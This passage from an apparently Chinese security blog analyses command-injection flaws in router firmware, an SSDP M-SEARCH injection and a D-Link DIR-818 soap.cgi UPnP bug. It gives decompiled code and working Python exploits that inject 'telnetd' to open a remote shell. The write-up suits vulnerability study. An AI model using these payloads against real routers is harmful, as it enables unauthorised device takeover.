src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823134728002.png" alt="image-20240823134728002"></p><p>这里直接走到lxmldbc_system函数了</p><p>所以ssdp包中应该包含<code>:device:</code></p><h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>修改上面ssdp包示例的那个包进行发包测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">M</span>-SEARCH * HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">HOST</span>:<span class="hljs-number">192.168.0.1</span><br><span class="hljs-attribute">ST</span>:urn:device:<span class="hljs-number">1</span>;touch /tmp/<span class="hljs-number">1</span><br><span class="hljs-attribute">MX</span>:<span class="hljs-number">3</span><br><span class="hljs-attribute">MAN</span>:<span class="hljs-string">&quot;ssdp:discover&quot;</span><br><br><br></code></pre></td></tr></table></figure><p><strong>这里的空格和换行非常严格</strong> ，踩坑了</p><p>exp</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">os</span><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&quot;192.168.0.1&quot;</span>,<span class="hljs-number">1900</span>,typ=<span class="hljs-string">&#x27;udp&#x27;</span>)<br>payload  = b<span class="hljs-string">&#x27;M-SEARCH * HTTP/1.1\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;HOST:192.168.0.1:1900\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;ST:urn:device:1;telnetd\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;MX:2\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;MAN:&quot;ssdp:discover&quot;\n\n&#x27;</span><br><span class="hljs-built_in">io</span>.send(payload)<br>sleep(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">os</span>.system(<span class="hljs-string">&#x27;telnet &#x27;</span> + <span class="hljs-string">&#x27;192.168.0.1&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823130837246.png" alt="image-20240823130837246"></p><h4 id="DLink-818-RCE-soapcgi-main-upnp"><a href="#DLink-818-RCE-soapcgi-main-upnp" class="headerlink" title="DLink-818 RCE soapcgi_main upnp"></a>DLink-818 RCE soapcgi_main upnp</h4><p>漏洞点存在于soapcgi_main函数中</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">int</span> soapcgi_main()<br>&#123;<br>  <span class="hljs-regexp">//</span> 初始化 <span class="hljs-number">v0</span> 为 <span class="hljs-number">0</span><br>  <span class="hljs-number">v0</span> = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-regexp">//</span> 调用 sub_40E6B4 函数，并将返回值赋值给 <span class="hljs-number">v1</span><br>  <span class="hljs-number">v1</span> = sub_40E6B4();<br><br>  <span class="hljs-regexp">//</span> 如果 <span class="hljs-number">v1</span> 大于等于 <span class="hljs-number">0</span>，则说明 sub_40E6B4 函数执行成功，继续执行<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">v1</span> &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-regexp">//</span> 获取环境变量 <span class="hljs-string">&quot;CONTENT_TYPE&quot;</span> 的值，并将返回值赋值给 <span class="hljs-number">v2</span><br>    <span class="hljs-number">v2</span> = getenv(<span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量 <span class="hljs-string">&quot;REQUEST_URI&quot;</span> 的值，并将返回值赋值给 <span class="hljs-number">v3</span><br>    <span class="hljs-number">v3</span> = getenv(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量 <span class="hljs-string">&quot;HTTP_SOAPACTION&quot;</span> 的值，并将返回值赋值给 <span class="hljs-number">v4</span><br>    <span class="hljs-number">v4</span> = getenv(<span class="hljs-string">&quot;HTTP_SOAPACTION&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量 <span class="hljs-string">&quot;REQUEST_METHOD&quot;</span> 的值，并将返回值赋值给 <span class="hljs-number">v5</span><br>    <span class="hljs-number">v5</span> = getenv(<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>);<br><br>    <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v2</span> 是否存在，以及 <span class="hljs-number">v2</span> 的前 <span class="hljs-number">8</span> 个字符是否与 <span class="hljs-string">&quot;text/xml&quot;</span> 相同，如果满足条件则继续执行<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-number">v2</span> &amp;&amp; !strncasecmp(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;text/xml&quot;</span>, 8u) )<br>    &#123;<br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v3</span> 是否存在，如果不存在则跳转到 LABEL_21<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v3</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br><br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v4</span> 是否存在，如果不存在则跳转到 LABEL_21<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v4</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br><br>      <span class="hljs-regexp">//</span> 在 <span class="hljs-number">v3</span> 中查找字符 <span class="hljs-string">&#x27;?&#x27;</span>, 并将返回值赋值给 <span class="hljs-number">v9</span><br>      <span class="hljs-number">v9</span> = strchr(<span class="hljs-number">v3</span>, <span class="hljs-number">63</span>);<br>      <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v9</span> 赋值给 <span class="hljs-number">v10</span><br>      <span class="hljs-number">v10</span> = <span class="hljs-number">v9</span>;<br><br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v9</span> 是否为 NULL，以及 <span class="hljs-number">v9</span> 的前 <span class="hljs-number">9</span> 个字符是否与 <span class="hljs-string">&quot;?service=&quot;</span> 相同，如果满足条件则继续执行<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v9</span> || strncmp(<span class="hljs-number">v9</span>, <span class="hljs-string">&quot;?service=&quot;</span>, 9u) )<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br><br>      <span class="hljs-regexp">//</span> 获取 <span class="hljs-number">v4</span> 字符串的最后一个字符的地址，并将其赋值给 <span class="hljs-number">v11</span><br>      <span class="hljs-number">v11</span> = &amp;<span class="hljs-number">v4</span>[strlen(<span class="hljs-number">v4</span>) - <span class="hljs-number">1</span>];<br><br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v11</span> 指向的字符是否为 <span class="hljs-string">&#x27;&quot;&#x27;</span>，如果是则将其设置为 <span class="hljs-number">0</span><br>      <span class="hljs-keyword">if</span> ( *<span class="hljs-number">v11</span> == <span class="hljs-number">34</span> )<br>        *<span class="hljs-number">v11</span> = <span class="hljs-number">0</span>;<br><br>      <span class="hljs-regexp">//</span> 获取 <span class="hljs-number">v4</span> 字符串中第一个 <span class="hljs-string">&#x27;&quot;&#x27;</span> 字符之后的地址，并将其赋值给 <span class="hljs-number">v12</span><br>      <span class="hljs-number">v12</span> = &amp;<span class="hljs-number">v4</span>[*<span class="hljs-number">v4</span> == <span class="hljs-number">0x22</span>];<br><br>      <span class="hljs-regexp">//</span> 在 <span class="hljs-number">v12</span> 中查找字符 <span class="hljs-string">&#x27;#&#x27;</span>, 并将返回值赋值给 <span class="hljs-number">v13</span><br>      <span class="hljs-number">v13</span> = strchr(<span class="hljs-number">v12</span>, <span class="hljs-number">35</span>);<br>      <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v13</span> 转换为整数，并赋值给 dword_439100<br>      dword_439100 = (<span class="hljs-keyword">int</span>)<span class="hljs-number">v13</span>;<br><br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v13</span> 是否为 NULL，如果为 NULL 则跳转到 LABEL_21<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v13</span> )<br>      &#123;<br>LABEL_21:<br>        <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v0</span> 设置为 -<span class="hljs-number">1</span><br>        <span class="hljs-number">v0</span> = -<span class="hljs-number">1</span>;<br>        <span class="hljs-regexp">//</span> 跳转到 LABEL_22<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>      &#125;<br><br>      // 将 <span class="hljs-number">v13</span> 指向的字符设置为 <span class="hljs-number">0</span><br>      *<span class="hljs-number">v13</span> = <span class="hljs-number">0</span>;<br>      <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v13</span> 加 <span class="hljs-number">1</span>，并转换为整数，赋值给 dword_439100<br>      dword_439100 = (<span class="hljs-keyword">int</span>)(<span class="hljs-number">v13</span> + <span class="hljs-number">1</span>);<br><br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v5</span> 是否与 <span class="hljs-string">&quot;POST&quot;</span> 相同，如果相同则继续执行<br>      <span class="hljs-keyword">if</span> ( !strcasecmp(<span class="hljs-number">v5</span>, <span class="hljs-string">&quot;POST&quot;</span>) )<br>      &#123;<br>        <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v10</span> 加 <span class="hljs-number">9</span>，并将其赋值给 <span class="hljs-number">v14</span><br>        <span class="hljs-number">v14</span> = <span class="hljs-number">v10</span> + <span class="hljs-number">9</span>;<br>        <span class="hljs-regexp">//</span> 获取当前进程的 ID，并将其赋值给 <span class="hljs-number">v15</span><br>        <span class="hljs-number">v15</span> = getpid();<br>        <span class="hljs-regexp">//</span> 使用 <span class="hljs-keyword">sprintf</span> 函数将字符串 <span class="hljs-string">&quot;/runtime/services/upnp/pid<span class="hljs-variable">%d</span>&quot;</span> 格式化为字符串，并将其赋值给 byte_437CC0<br>        <span class="hljs-keyword">sprintf</span>(byte_437CC0, <span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/pid<span class="hljs-variable">%d</span>&quot;</span>, <span class="hljs-string">&quot;/runtime/services/upnp&quot;</span>, <span class="hljs-number">v15</span>);<br>        <span class="hljs-regexp">//</span> 调用 cgibin_parse_request 函数，参数为 sub_40E584、<span class="hljs-number">0</span> 和 <span class="hljs-number">0x10000</span><br>        cgibin_parse_request(sub_40E584, <span class="hljs-number">0</span>, <span class="hljs-number">0x10000</span>);<br>        <span class="hljs-regexp">//</span> 获取环境变量 <span class="hljs-string">&quot;SERVER_ID&quot;</span> 的值，并将其赋值给 <span class="hljs-number">v16</span><br>        <span class="hljs-number">v16</span> = getenv(<span class="hljs-string">&quot;SERVER_ID&quot;</span>);<br>        <span class="hljs-regexp">//</span> 将 dword_439100 转换为 const char* 类型，并将其赋值给 <span class="hljs-number">v17</span><br>        <span class="hljs-number">v17</span> = (const char *)dword_439100;<br>        <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v16</span> 赋值给 <span class="hljs-number">v19</span><br>        <span class="hljs-number">v19</span> = <span class="hljs-number">v16</span>;<br>        <span class="hljs-regexp">//</span> 获取当前进程的 ID，并将其赋值给 <span class="hljs-number">v18</span><br>        <span class="hljs-number">v18</span> = getpid();<br>        <span class="hljs-regexp">//</span> 使用 <span class="hljs-keyword">sprintf</span> 函数将字符串 <span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/ACTION.<span class="hljs-variable">%s</span>.php\nACTION_NODEBASE=<span class="hljs-variable">%s</span>\nINF_UID=<span class="hljs-variable">%s</span>\nSERVICE_TYPE=<span class="hljs-variable">%s</span>\nACTION_NAME=<span class="hljs-variable">%s</span>\nSHELL_FILE=<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span> 格式化为字符串，并将其赋值给 byte_438D00<br>        <span class="hljs-keyword">sprintf</span>(<br>          byte_438D00,<br>          <span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/ACTION.<span class="hljs-variable">%s</span>.php\nACTION_NODEBASE=<span class="hljs-variable">%s</span>\nINF_UID=<span class="hljs-variable">%s</span>\nSERVICE_TYPE=<span class="hljs-variable">%s</span>\nACTION_NAME=<span class="hljs-variable">%s</span>\nSHELL_FILE=<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span>,<br>          <span class="hljs-string">&quot;/htdocs/upnp&quot;</span>,<br>          <span class="hljs-number">v14</span>,<br>          byte_437CC0,<br>          <span class="hljs-number">v19</span>,<br>          <span class="hljs-number">v12</span>,<br>          <span class="hljs-number">v17</span>,<br>          <span class="hljs-string">&quot;/var/run&quot;</span>,<br>          <span class="hljs-number">v14</span>,<br>          <span class="hljs-number">v18</span>);<br><br>        <span class="hljs-regexp">//</span> 调用 xmldbc_ephp_wb 函数，参数为 <span class="hljs-number">0</span>、<span class="hljs-number">0</span>、byte_438D00 和 byte_437D00<br>        <span class="hljs-keyword">if</span> ( !xmldbc_ephp_wb(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, byte_438D00, byte_437D00) )<br>        &#123;<br>          <span class="hljs-regexp">//</span> 检查 cgibin_fill_http_content_len 函数的返回值是否为 <span class="hljs-number">0</span>，如果为 <span class="hljs-number">0</span> 则说明函数执行失败，则打印 byte_437D00 指向的字符串<br>          <span class="hljs-keyword">if</span> ( !cgibin_fill_http_content_len(byte_437D00, <span class="hljs-number">4096</span>) )<br>            <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;<span class="hljs-variable">%s</span>&quot;</span>, byte_437D00);<br><br>          <span class="hljs-regexp">//</span> 获取当前进程的 ID，并将其赋值给 <span class="hljs-number">v20</span><br>          <span class="hljs-number">v20</span> = getpid();<br>          <span class="hljs-regexp">//</span> 使用 <span class="hljs-keyword">sprintf</span> 函数将字符串 <span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span> 格式化为字符串，并将其赋值给 byte_438D00<br>          <span class="hljs-keyword">sprintf</span>(byte_438D00, <span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span>, <span class="hljs-string">&quot;/var/run&quot;</span>, <span class="hljs-number">v14</span>, <span class="hljs-number">v20</span>);<br>          <span class="hljs-regexp">//</span> 打开 byte_438D00 指向的文件，并以追加模式打开，并将返回值赋值给 <span class="hljs-number">v21</span><br>          <span class="hljs-number">v21</span> = fopen(byte_438D00, <span class="hljs-string">&quot;a+&quot;</span>);<br><br>          <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v21</span> 是否为 NULL，如果为 NULL 则说明打开文件失败，则直接执行后续代码<br>          <span class="hljs-keyword">if</span> ( <span class="hljs-number">v21</span> )<br>          &#123;<br>            <span class="hljs-regexp">//</span> 获取当前进程的 ID，并将其赋值给 <span class="hljs-number">v22</span><br>            <span class="hljs-number">v22</span> = getpid();<br>            <span class="hljs-regexp">//</span> 向 <span class="hljs-number">v21</span> 指向的文件写入字符串 <span class="hljs-string">&quot;rm -f <span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span>，并使用 <span class="hljs-number">v22</span> 替换 <span class="hljs-variable">%d</span><br>            fprintf(<span class="hljs-number">v21</span>, <span class="hljs-string">&quot;rm -f <span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span>, <span class="hljs-string">&quot;/var/run&quot;</span>, <span class="hljs-number">v14</span>, <span class="hljs-number">v22</span>);<br>            <span class="hljs-regexp">//</span> 关闭 <span class="hljs-number">v21</span> 指向的文件<br>            fclose(<span class="hljs-number">v21</span>);<br>            <span class="hljs-regexp">//</span> 获取当前进程的 ID，并将其赋值给 <span class="hljs-number">v23</span><br>            <span class="hljs-number">v23</span> = getpid();<br>            <span class="hljs-regexp">//</span> 使用 <span class="hljs-keyword">sprintf</span> 函数将字符串 <span class="hljs-string">&quot;sh <span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh &gt; /dev/console &amp;&quot;</span> 格式化为字符串，并将其赋值给 byte_438D00<br>            <span class="hljs-keyword">sprintf</span>(byte_438D00, <span class="hljs-string">&quot;sh <span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh &gt; /dev/console &amp;&quot;</span>, <span class="hljs-string">&quot;/var/run&quot;</span>, <span class="hljs-number">v14</span>, <span class="hljs-number">v23</span>);<br>            <span class="hljs-regexp">//</span> 执行 byte_438D00 指向的 shell 命令<br>            <span class="hljs-keyword">system</span>(byte_438D00);<br>          &#125;<br>        &#125;<br><br>        // 将 <span class="hljs-number">v0</span> 设置为 <span class="hljs-number">0</span><br>        <span class="hljs-number">v0</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-regexp">//</span> 调用 xmldbc_del 函数，参数为 <span class="hljs-number">0</span>、<span class="hljs-number">0</span> 和 byte_437CC0<br>        xmldbc_del(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, byte_437CC0);<br>        <span class="hljs-regexp">//</span> 跳转到 LABEL_22<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>      &#125;<br><br>      // 将 <span class="hljs-number">v7</span> 设置为空字符串<br>      <span class="hljs-number">v7</span> = <span class="hljs-string">&quot;&quot;</span>;<br>      <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v8</span> 设置为 <span class="hljs-string">&quot;unsupported HTTP request&quot;</span><br>      <span class="hljs-number">v8</span> = <span class="hljs-string">&quot;unsupported HTTP request&quot;</span>;<br>      <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v6</span> 设置为 <span class="hljs-number">400</span><br>      <span class="hljs-number">v6</span> = <span class="hljs-number">400</span>;<br>    &#125;<br>    // 否则，说明 CONTENT_TYPE 不为 text/xml，则将 <span class="hljs-number">v6</span> 设置为 <span class="hljs-number">415</span>，<span class="hljs-number">v7</span> 设置为 <span class="hljs-number">0</span>，<span class="hljs-number">v8</span> 设置为 <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-number">v6</span> = <span class="hljs-number">415</span>;<br>      <span class="hljs-number">v7</span> = <span class="hljs-number">0</span>;<br>      <span class="hljs-number">v8</span> = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    // 将 <span class="hljs-number">v0</span> 设置为 -<span class="hljs-number">1</span><br>    <span class="hljs-number">v0</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-regexp">//</span> 调用 cgibin_print_http_status 函数，参数为 <span class="hljs-number">v6</span>、<span class="hljs-number">v7</span> 和 <span class="hljs-number">v8</span><br>    cgibin_print_http_status(<span class="hljs-number">v6</span>, <span class="hljs-number">v7</span>, <span class="hljs-number">v8</span>);<br><br>LABEL_22:<br>    <span class="hljs-regexp">//</span> 调用 sub_40E7D0 函数，参数为 <span class="hljs-number">v1</span><br>    sub_40E7D0(<span class="hljs-number">v1</span>);<br>  &#125;<br><br>  // 返回 <span class="hljs-number">v0</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">v0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a><strong>代码分析：</strong></h5><p>这个函数 <code>soapcgi_main</code> 主要处理来自 UPnP 设备的 SOAP 请求，并根据请求内容执行相应的操作。</p><p><strong>代码逻辑：</strong></p><ol><li><strong>获取环境变量：</strong> 函数首先获取几个重要的环境变量：<ul><li><code>CONTENT_TYPE</code>: 请求的内容类型，用于判断是否为 XML 格式。</li><li><code>REQUEST_URI</code>: 请求的 URI，用于解析请求的具体内容。</li><li><code>HTTP_SOAPACTION</code>: SOAP 操作名称，用于确定要执行的操作。</li><li><code>REQUEST_METHOD</code>: 请求方法，用于判断是 GET 还是 POST 请求。</li></ul></li><li><strong>检查请求格式：</strong> 函数检查这些环境变量的值是否符合 SOAP 协议的规范，例如：<ul><li>检查 <code>CONTENT_TYPE</code> 是否为 “text&#x2F;xml”。</li><li>检查 <code>REQUEST_URI</code> 和 <code>HTTP_SOAPACTION</code> 是否存在。</li><li>检查 <code>REQUEST_URI</code> 是否包含 “?service&#x3D;”。</li><li>检查 <code>HTTP_SOAPACTION</code> 是否以 ‘“‘ 开头和结尾。</li></ul></li><li><strong>解析 SOAP 请求：</strong> 函数解析 <code>HTTP_SOAPACTION</code> 中的 SOAP 操作名称，并根据操作名称执行相应的操作。</li><li><strong>执行操作：</strong> 函数根据 SOAP 操作名称，调用不同的函数或脚本进行处理。</li></ol><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a><strong>漏洞分析：</strong></h5><ol><li><strong>用户可控输入：</strong> <code>REQUEST_URI</code> 环境变量的值是由用户控制的，攻击者可以恶意构造该环境变量的值。</li><li><strong>拼接 shell 命令：</strong> 函数在处理 SOAP 请求时，会提取 <code>REQUEST_URI</code> 中的 <code>?service=</code> 后面的部分，并将其作为 SOAP 操作名称。然后，它会将该操作名称拼接进 shell 命令中，例如：<ul><li><code>%s/ACTION.%s.php\nACTION_NODEBASE=%s\nINF_UID=%s\nSERVICE_TYPE=%s\nACTION_NAME=%s\nSHELL_FILE=%s/%s_%d.sh</code></li></ul></li><li><strong>执行命令：</strong> 函数使用 <code>system</code> 函数执行拼接后的 shell 命令。</li><li>综上分析可知，漏洞出现的原因是POST 的URI中<code>?service=</code>后面的内容可由输入控制，全程没有对该处输入进行检查，直接sprintf后由system函数执行。</li></ol><h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>根据UPnP官方文档，要调用UPnP设备上的服务，控制点必须以POST方法发送以下格式的请求</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823141840975.png" alt="image-20240823141840975"></p><p>soap端口在49152</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823143839889.png" alt="image-20240823143839889"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823143953213.png" alt="image-20240823143953213"></p><p>soap.cgi可以在49152访问到</p><p>exp</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs swift">from socket <span class="hljs-keyword">import</span> *<br>from os <span class="hljs-keyword">import</span> *<br>from time <span class="hljs-keyword">import</span> *<br> <br>request <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;POST /soap.cgi?service=;telnetd -p 7080 HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br>request <span class="hljs-operator">+=</span> b<span class="hljs-string">&quot;Host: 192.168.0.1:49152<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br>request <span class="hljs-operator">+=</span> b<span class="hljs-string">&quot;Content-Type: text/xml<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br>request <span class="hljs-operator">+=</span> b<span class="hljs-string">&quot;Content-Length: 200<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br>request <span class="hljs-operator">+=</span> b<span class="hljs-string">&quot;SOAPAction: <span class="hljs-subst">\&quot;</span>urn:schemas-upnp-org:service:serviceType:v#actionName<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br><br>s <span class="hljs-operator">=</span> socket(<span class="hljs-type">AF_INET</span>, <span class="hljs-type">SOCK_STREAM</span>)<br>s.connect((gethostbyname(<span class="hljs-string">&quot;192.168.0.1&quot;</span>), <span class="hljs-number">49152</span>))<br>s.send(request)<br>  <br>sleep(<span class="hljs-number">5</span>)<br>system(&#x27;telnet <span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">7080</span>&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823162755843.png" alt="image-20240823162755843"></p><p>动调</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823160953326.png" alt="image-20240823160953326"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DWR-932B后门漏洞分析</title>
    <link href="/2024/08/07/DWR-932B%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2024/08/07/DWR-932B%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
